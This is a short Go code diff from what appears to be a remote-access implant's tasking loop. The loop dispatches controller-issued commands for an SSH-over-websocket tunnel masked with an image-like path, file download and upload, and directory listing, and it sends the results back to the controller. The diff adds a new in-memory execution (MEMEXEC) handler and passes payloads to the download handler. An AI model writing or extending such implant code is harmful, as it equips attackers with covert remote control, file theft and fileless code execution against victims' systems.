@@ -85,7 +85,7 @@ func Start() {
 			print("->", tcode, "calling ssh for ", h.Socket)
 			ssh.Wsclient("aaa", "/any.png", h.Socket)
 		case internal.DOWN:
-			response := HandleDownload(ctx, tid)
+			response := HandleDownload(ctx, payload, tid)
 			h.Post([]byte(response))
 		case internal.UPL:
 			response := HandleUpload(ctx, payload, tid)
@@ -100,6 +100,9 @@ func Start() {
 			h.Post([]byte(response))
 		case internal.LS:
 			response := HandleLS(ctx, payload, tid)
+			h.Post([]byte(response))
+		case internal.MEMEXEC:
+			response := HandleMEMEXEC(ctx, payload, tid)
 			h.Post([]byte(response))
 		default:
 			print("->", tcode, "Nothing")
